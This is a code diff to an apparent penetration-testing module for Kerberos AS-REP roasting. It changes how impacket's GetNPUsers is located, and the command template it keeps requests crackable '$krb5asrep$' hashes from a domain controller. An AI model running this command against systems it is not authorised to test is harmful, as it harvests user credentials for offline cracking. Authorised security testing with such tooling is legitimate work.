@@ -23,7 +23,8 @@ META = {
     "mitre": ['T1558.004'],
     "cwe": ['CWE-522'],
     "tactic": 'Credential Access',
-    "requires": ["impacket-GetNPUsers"],
+    "requires": [],                 # resolved at runtime across impacket flavours
+    "requires_py": ["impacket"],    # the real dependency (CLI name varies)
     "requires_files": [USERS],
     "ports": [("tcp", 88)],
     "success_regex": r"\$krb5asrep\$",
@@ -36,6 +37,11 @@ def run(target, ctx):
     # user list path is quoted (their checkout path may contain spaces); the
     # template still uses {domain}/{target} which core fills in.
     users_q = shlex.quote(USERS)
+    from modules import _impacket
+    tool = _impacket.resolve("GetNPUsers")
+    if not tool:
+        return ("# kerberos_asrep vs {t}\n\n[SKIP] impacket not installed — GetNPUsers "
+                "unavailable (pip install impacket / apt python3-impacket).".format(t=target))
     return ctx.run_cmd(
-        f"impacket-GetNPUsers {{domain}}/ -no-pass -usersfile {users_q} "
+        f"{tool} {{domain}}/ -no-pass -usersfile {users_q} "
         f"-dc-ip {{target}} -request", target)
